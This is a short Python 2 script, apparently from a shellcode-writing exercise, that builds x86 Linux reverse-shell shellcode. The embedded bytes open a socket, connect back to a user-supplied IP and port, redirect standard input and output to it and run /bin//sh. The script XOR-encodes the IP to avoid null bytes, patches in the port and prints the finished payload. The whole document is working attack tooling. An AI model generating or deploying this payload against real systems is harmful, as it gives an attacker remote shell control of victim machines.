import socket
import struct
import sys

code =  ""
code += "\\x89\\xe5\\x31\\xc0\\x31\\xc9\\x31\\xd2"
code += "\\x50\\x50\\xb8\\xff\\xff\\xff\\xff\\xbb"
code += "\\x80\\xff\\xff\\xfe\\x31\\xc3\\x53\\x66"
code += "\\x68\\x11\\x5c\\x66\\x6a\\x02\\x31\\xc0"
code += "\\x31\\xdb\\x66\\xb8\\x67\\x01\\xb3\\x02"
code += "\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x66\\xb8"
code += "\\x6a\\x01\\x89\\xe1\\x89\\xea\\x29\\xe2"
code += "\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0"
code += "\\xb0\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf6"
code += "\\x31\\xc0\\x31\\xd2\\x50\\x68\\x2f\\x2f"
code += "\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89"
code += "\\xe3\\xb0\\x0b\\xcd\\x80"

if len(sys.argv) < 3:
    print 'Usage: python {name} [ip] [port]'.format(name = sys.argv[0])
    exit(1)

ip = socket.inet_aton(sys.argv[1])

# Find valid XOR byte
xor_byte = 0
for i in range(1, 256):
    matched_a_byte = False
    for octet in ip:
        if i == int(octet.encode('hex'), 16):
            matched_a_byte = True
            break

    if not matched_a_byte:
        xor_byte = i
        break

if xor_byte == 0:
    print 'Failed to find a valid XOR byte'
    exit(1)

# Inject the XOR bytes
code = code.replace("\\xb8\\xff\\xff\\xff\\xff", "\\xb8\\x{x}\\x{x}\\x{x}\\x{x}".format(x = struct.pack('B', xor_byte).encode('hex')))

# Inject the IP address
ip_bytes = []
for i in range(0, 4):
    ip_bytes.append(struct.pack('B', int(ip[i].encode('hex'), 16) ^ xor_byte).encode('hex'))

code = code.replace("\\xbb\\x80\\xff\\xff\\xfe", "\\xbb\\x{b1}\\x{b2}\\x{b3}\\x{b4}".format(
    b1 = ip_bytes[0],
    b2 = ip_bytes[1],
    b3 = ip_bytes[2],
    b4 = ip_bytes[3]
))

# Inject the port number
port = hex(socket.htons(int(sys.argv[2])))
code = code.replace("\\x66\\x68\\x11\\x5c", "\\x66\\x68\\x{b1}\\x{b2}".format(
    b1 = port[4:6],
    b2 = port[2:4]
))

print code
